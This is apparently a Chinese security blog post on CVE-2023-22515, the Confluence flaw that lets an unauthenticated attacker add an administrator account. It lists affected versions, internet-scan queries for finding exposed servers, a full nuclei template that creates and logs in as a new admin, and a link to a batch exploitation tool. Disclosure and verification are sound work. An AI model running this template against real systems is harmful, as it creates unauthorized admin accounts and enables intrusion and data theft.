#  【漏洞情报 | 新】Confluence 未授权提权访问漏洞

原创 4Zen  [ 划水但不摆烂 ](javascript:void\(0\);)

**划水但不摆烂** ![]()

微信号 gh_0ea5f4b417af

功能介绍 Hi~这里是"划水但不摆烂"，公众号会不定期进行安全相关的资源、技术与经验分享，保持以学徒之心多角度去思考与分享！

____

___发表于_

收录于合集 #漏洞复现 15个

## 免责声明

文章所涉及内容，仅供安全研究与教学之用，由于传播、利用本文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。

## 产品简介

Atlassian Confluence Data Center & Server 是 Atlassian
公司提供的一款企业级团队协作和知识管理软件。它旨在帮助团队协同工作、共享知识、记录文档和协作编辑等。

## 漏洞描述

Confluence 中的 CVE-2023-22515
漏洞存在未授权添加管理员用户。攻击者可构造恶意请求添加管理员，从而登录系统，造成敏感信息泄漏等危害。

## 影响版本

    
    
      
    8.0.0 <= Confluence Data Center and Confluence Server <= 8.0.4  
    8.1.0 <= Confluence Data Center and Confluence Server <= 8.1.4  
    8.2.0 <= Confluence Data Center and Confluence Server <= 8.2.3  
    8.3.0 <= Confluence Data Center and Confluence Server <= 8.3.2  
    8.4.0 <= Confluence Data Center and Confluence Server <= 8.4.2  
    8.5.0 <= Confluence Data Center and Confluence Server <= 8.5.1  
    

## 网络测绘

favicon图标特征

![]()

FOFA网络测绘搜索

    
    
    app="ATLASSIAN-Confluence"  
    

鹰图网络测绘搜索

    
    
    app.name="Confluence"  
    

## 漏洞复现

使用添加的管理员尝试登录![]()

![]()

nuclei批量验证POC模板

    
    
    来源：https://templates.nuclei.sh/public/CVE-2023-22515.yaml  
    
    
    
    id: CVE-2023-22515  
      
    info:  
      name: Atlassian Confluence - Privilege Escalation  
      author: s1r1us,iamnoooob,rootxharsh,pdresearch  
      severity: critical  
      description: |  
        Atlassian Confluence Data Center and Server contains a privilege escalation vulnerability that allows an attacker to create unauthorized Confluence administrator accounts and access Confluence.  
      reference:  
        - https://attackerkb.com/topics/Q5f0ItSzw5/cve-2023-22515/rapid7-analysis  
        - https://confluence.atlassian.com/security/cve-2023-22515-privilege-escalation-vulnerability-in-confluence-data-center-and-server-1295682276.html  
        - https://confluence.atlassian.com/kb/faq-for-cve-2023-22515-1295682188.html  
        - https://jira.atlassian.com/browse/CONFSERVER-92475  
        - https://www.cisa.gov/news-events/alerts/2023/10/05/cisa-adds-three-known-exploited-vulnerabilities-catalog  
      remediation: |  
        Update to the latest version of Confluence  
      classification:  
        cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H  
        cvss-score: 10  
        cve-id: CVE-2023-22515  
        epss-score: 0.00126  
      metadata:  
        fofa-query: app="ATLASSIAN-Confluence"  
        max-request: 6  
        verified: true  
      tags: cve,cve2023,confluence,auth-bypass,kev,intrusive  
      
    variables:  
      username: "{{rand_base(10)}}"  
      password: "{{rand_base(10)}}"  
      email: "{{username}}@{{password}}"  
      
    http:  
      - raw:  
          - |  
            GET /setup/setupadministrator-start.action HTTP/1.1  
            Host: {{Hostname}}  
          - |  
            GET /server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=0&cache{{randstr}} HTTP/1.1  
            Host: {{Hostname}}  
          - |  
            GET /setup/setupadministrator-start.action HTTP/1.1  
            Host: {{Hostname}}  
          - |  
            @timeout:20s  
            POST /setup/setupadministrator.action HTTP/1.1  
            Host: {{Hostname}}  
            Content-Type: application/x-www-form-urlencoded  
            X-Atlassian-Token: no-check  
      
            username={{to_lower(username)}}&fullName=admin&email={{email}}.com&password={{password}}&confirm={{password}}&setup-next-button=Next  
          - |  
            POST /dologin.action HTTP/1.1  
            Host: {{Hostname}}  
            Content-Type: application/x-www-form-urlencoded  
            X-Atlassian-Token: no-check  
      
            os_username={{to_lower(username)}}&os_password={{password}}&login=Log+in&os_destination=%2Findex.action  
          - |  
            GET /welcome.action HTTP/1.1  
            Host: {{Hostname}}  
      
        cookie-reuse: true  
        redirects: true  
        matchers:  
          - type: dsl  
            dsl:  
              - contains(body_1, 'Setup is already complete')  
              - contains(body_3, 'Please configure the system administrator account for this Confluence installation')  
              - contains(location_5, '/index.action')  
              - status_code_5 == 302  
              - contains(body_6, 'Administration')  
            condition: and  
      
        extractors:  
          - type: dsl  
            dsl:  
              - '"USER: "+ username'  
              - '"PASS: "+ password'  
    

![]()

批量漏洞危害验证工具

    
    
    https://github.com/Chocapikk/CVE-2023-22515  
    

![]()

## 修复方案

官方已发布修复建议，建议受影响的用户尽快升级至安全版本。
https://www.atlassian.com/zh/software/confluence/download-archives

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

